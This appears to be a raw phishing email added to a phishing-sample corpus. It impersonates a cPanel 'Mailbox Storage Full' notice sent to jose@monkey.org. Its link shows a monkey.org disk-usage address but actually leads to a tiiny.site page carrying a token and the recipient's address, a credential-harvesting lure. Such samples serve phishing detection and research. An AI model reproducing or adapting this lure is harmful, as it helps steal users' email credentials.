@@ -1,0 +1,152 @@
+Return-Path: info@phloxblaetil.com
+Delivered-To: jose@monkey.org
+X-FDA: 82441968168.35.FCC3651
+Received: from ph.phloxblaetil.com (ph.phloxblaetil.com [83.137.157.42])
+	by imf07.b.hostedemail.com (Postfix) with ESMTP id 26BE9A000A
+	for <jose@monkey.org>; Mon, 12 Aug 2024 02:12:01 +0000 (UTC)
+Authentication-Results: imf07.b.hostedemail.com;	dkim=pass
+ header.d=phloxblaetil.com header.s=ph header.b=gb4WmV7F;	dmarc=pass
+ (policy=reject) header.from=phloxblaetil.com;	spf=pass
+ (imf07.b.hostedemail.com: domain of info@phloxblaetil.com designates
+ 83.137.157.42 as permitted sender) smtp.mailfrom=info@phloxblaetil.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1723428664; a=rsa-sha256;
+	cv=none;
+	b=DVNCkx2VnFKbschTbcgD/I43bIJsCs6SHIfj3h5Tg+Pwb31UqaLs81MwxMQlix17lwZbsg
+	F1UxoJr0TkVPSeatG9EjaX+2yoYt9mHVkH9RZ7UQE68a7IGo+EoDtEE10CxbeISdzLnCYY
+	20XrbcCGtPo8uovGiKb4G9TAlUMK6YQ=
+ARC-Authentication-Results: i=1;	imf07.b.hostedemail.com;	dkim=pass
+ header.d=phloxblaetil.com header.s=ph header.b=gb4WmV7F;	dmarc=pass
+ (policy=reject) header.from=phloxblaetil.com;	spf=pass
+ (imf07.b.hostedemail.com: domain of info@phloxblaetil.com designates
+ 83.137.157.42 as permitted sender) smtp.mailfrom=info@phloxblaetil.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1723428664;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=sC+kwxyu1qz6nyldCa6YT7AM1z3Rg8nw1Pp5sBVhaGw=;
+	b=7oVnuitE2Yy4GNmzsJ65qrm1Xo5Q2by4DpNrzvzey44YOQ6uCzXm7c0qw4733uhB1WToQg
+	vg2wWqF7K3kEZWN4excGkvU1ZZqrCN3tgDYoDR2Y/naUJLPVrjIKGUSHB2t2eVy5DdeYK9
+	YgiT2CzyZCWsYQMr9aZfdSsdCDmE+sE=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=ph; d=phloxblaetil.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=info@phloxblaetil.com;
+ bh=aIflq2OW3VSA6p8N5OQoLxWYQKc=; =?utf-8?q?b=3Dgb4WmV7Fy42mD1YnToOlzCCMKdwN?=
+ =?utf-8?q?9v9TYG5JpMkobmXDeD6yPNu1d7AqYZvTrK1+3k2vZwPvIKf3?=  
+ BjWevmKtk1fustDrwFh8+KXNh5PLECE9nedxkpbKLDp799y5yz0hBXZlJqcBctY1OfymH41ogVHT
+  
+ pE7BLZUmYd41ZTPBoT//YzjP5XZyS0QQY3fExkBoYxyi9TNtDCeIrnCv22Ujfezu6axBCURwdEi7
+  
+ UU/MJcMj6/XxvXsaicLkY4mY47EgrwUNegUr+Dl9xm6aKcqlRWWZyHDpv6K0pOD2e8CDK2S3imfs
+   pSp4iJ2xei7aPKJSP3yX2czEnmmpnX4pslaK3g==
+From: Storage Notification | monkey.org<info@phloxblaetil.com>
+To: jose@monkey.org
+Subject: Mailbox Storage Full
+Date: 11 Aug 2024 18:48:09 -0700
+Message-ID: <20240811184807.25E3B88113C97B61@phloxblaetil.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspam-User: 
+X-Rspamd-Server: rspam08
+X-Rspamd-Queue-Id: 26BE9A000A
+X-Stat-Signature: 61peh6upd1k9zqumr6gyqc538y33ceeo
+X-Spam-Status: No, score=1.20
+X-HE-Tag: 1723428721-870409
+X-HE-Meta: =?utf-8?q?U2FsdGVkX18xyMV2kk2gfIexIVOeZ5dB4S8eR5iLdFgR6bQbfsqKoPe?=
+ =?utf-8?q?xcafo0i6eZo/Oh/xG9cFEPMIdSv5mR5zxwoIv6QD4nv4Kg2DpI/mbR65x5Nm4g9rT?=
+ =?utf-8?q?yhUJIXbtS0JP3w9tIaQOa+O3jkkZlRDeMz3bj9N832JTOJj9rfHoPpXh9mJb/AEUE?=
+ =?utf-8?q?c59HZdEz0TNGTlnKs6vlsr97ej0SeuKzBlwP1k7nicxc06dvy/kpwD7L+MRcmrh4p?=
+ =?utf-8?q?FjtmqRGfsbpBJVP2yW7QDuK+NhzMHSIDUPChVpCVDJ+Xk/6AMYT0rhwPBEXrrpVDl?=
+ =?utf-8?q?DO50+gAzrTClKzPKtowCdm+QRjXJJzMAKYdDEtS/Iu96kNNlCD0pWnJ2jdPk8rdd0?=
+ =?utf-8?q?Z3JAs3BK/TW3zfuwSlQ4nzcATOLoQCkKSfnzz+FPHVUE0urgmzEeRXdxkMpsK8HTd?=
+ =?utf-8?q?PjODIz/WYow4xxNIOTySO3IYVqwBZrgLqeX2YhlXsvAtXJKAcilLCyS9pfg4wo+iw?=
+ =?utf-8?q?FjOJ+r9+RyTqwJ6qa9YSJ+9j5nbW+Ep/Dz3hB9HHn6/+OAD33taFDj8v6E47fsAe5?=
+ =?utf-8?q?bFpwKELM7e8MWiJjWsBqN0cJFXB5RG6BfsHXvZQetVAXZ0HGF8lImNQ4EabPOxYzg?=
+ =?utf-8?q?jroNh7xsOnA7m3A658tt1S+NvV7IKQ+pB1PiiqXcmN5YcijI4mBAjctrJAriMwKRy?=
+ =?utf-8?q?k1JCfAMXbtFTi4edn4D2lMMU/6k8fNCgSd5AakI9rusuG97nYY0+ZTB1DetludApS?=
+ =?utf-8?q?anWfisZ2r6Zi7qo0yGHx9OXkegMRCk4aJsFhyAIIISgWLbuwuA6hFLk3AHkCMEjsU?=
+ =?utf-8?q?DblxRp8TpCw26/VhN1rzUKZg8FHUNRN5XMDRmW554CMmACCwEAzR7tFbTjRvh3fyQ?=
+ =?utf-8?q?AdAJJ2qcBmKF65pl9Dhz324ZrEgVHEmuV0KTlxe/OEdxjFf31ihMrv7u2gKFbzyWh?=
+ =?utf-8?q?EllbgN4NYxVOs/3tnjXJ++_PcxJ4aOB4scoCmsNFZ6qA3YKVV4zsvD9bqeMZVtlsp?=
+ =?utf-8?q?dAo/5DhXz1CbVDPvAnwsWcpEXfaCRqr/jP+QLv2NRmCtAm220bdijxIsvch7KG1hY?=
+ =?utf-8?q?Cix+Y=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 233
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.17037">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<p><br class=3D"Apple-interchange-newline">
+<table width=3D"100%" style=3D"text-align: left; color: rgb(34, 34, 34); te=
+xt-transform: none; letter-spacing: normal; font-family: Arial, Helvetica, =
+sans-serif; font-size: small; font-style: normal; font-weight: 8AFcmXsQttSX=
+uBeYCL9fpa2rn5JrDwwoihMerrwF48V7Ar1EKNTZyGa6G2tMFMhEZNEReroTLe2gPSMQw6VZLSD=
+65AyBqzD255, 255); font-variant-ligatures: normal; font-variant-caps: norma=
+l; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text=
+-decoration-style: initial; text-decoration-color:=20
+initial;" border=3D"0" cellspacing=3D"0" cellpadding=3D"10">
+<tbody style=3D"">
+<tr style=3D"">
+<td align=3D"center" style=3D"margin: 0px; -ms-word-break: normal;">
+<table width=3D"680" style=3D"border-width: 0px; max-width: 680px;" border=
+=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"">
+<tr style=3D"">
+<td width=3D"680" height=3D"25" style=3D"margin: 0px; color: rgb(51, 51, 51=
+); font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans
+-serif; f=
+ont-size: 16px; -ms-word-break: normal;">Mailbox quota notification for jos=
+e@monkey.org.</td></tr>
+<tr style=3D"">
+<td style=3D"border-width: 2px; border-style: solid; border-color: rgb(232,=
+ 232, 232) rgb(232, 232, 232) rgb(255, 108, 44); margin: 0px; padding: 15px=
+ 0px 20px; -ms-word-break: normal;">
+<table width=3D"680" style=3D"font-family: &quot;Helvetica Neue&quot;, Helv=
+etica, Arial, sans-serif;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"=
+>
+<tbody style=3D"">
+<tr height=3D"265" style=3D"">
+<td width=3D"15" style=3D"margin: 0px; -ms-word-break: normal;"></td>
+<td width=3D"650" style=3D"margin: 0px; -ms-word-break: normal;">
+<table width=3D"100%" style=3D"" border=3D"0" cellspacing=3D"0" cellpadding=
+=3D"0">
+<tbody style=3D"">
+<tr style=3D"">
+<td style=3D"margin: 0px; -ms-word-break: normal;">
+<p style=3D"">The jose@monkey.org email account is nearly full.</p>
+<p style=3D"">The email account currently uses 98.4% of its capacity.</p>
+<p style=3D"">You should use the link below to increase storage for free as=
+ soon as possible in order to receive more emails.&nbsp;</p>
+<p style=3D""><br style=3D""></p>
+<p style=3D"">Use the Email Disk Usage tool at&nbsp;<a style=3D"color: rgb(=
+25, 106, 212); text-decoration: underline;" href=3D'https://session-update-=
+continue.tiiny.site/?token=3D6deb78bb-8431-4bcb-abf6-ff7e98cd7b4b&amp;ci=3D=
+jose@monkey.org"' target=3D"_blank" rel=3D"nofollow noopener noreferrer">ht=
+tps://monkey.org/?goto_app=3DEmail_DiskUsage</a>,&nbsp;</p></td></tr>
+<tr style=3D"">
+<td style=3D"margin: 0px; -ms-word-break: normal;">
+<div style=3D'color: rgb(102, 102, 102); padding-top: 5px; font-family: "He=
+lvetica Neue", Helvetica, Arial, sans-serif; font-size: 12px; margin-top: 5=
+px; border-top-color: rgb(232, 232, 232); border-top-width: 2px; border-top=
+-style: solid;'>
+<p style=3D"margin: 5px 0px 0px; padding: 0px;">The system generated this n=
+otice on 8/11/2024 6:48:07 p.m..</p></div>
+<p style=3D"">Do not reply to this automated message.</p></td></tr></tbody>=
+</table></td>
+<td width=3D"15" style=3D"margin: 0px; -ms-word-break: normal;"></td></tr><=
+/tbody></table></td></tr>
+<tr style=3D"">
+<td align=3D"center" style=3D"margin: 0px; padding-top: 10px; -ms-word-brea=
+k: normal;">
+<p style=3D'margin: 0px; padding: 0px; color: rgb(102, 102, 102); font-fami=
+ly: "Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 12px;'>monke=
+y.org Copyright&copy;&nbsp;2024 cPanel, L.L.C.</p></td></tr></tbody></table=
+></td></tr></tbody></table><p></p></body></html>
+
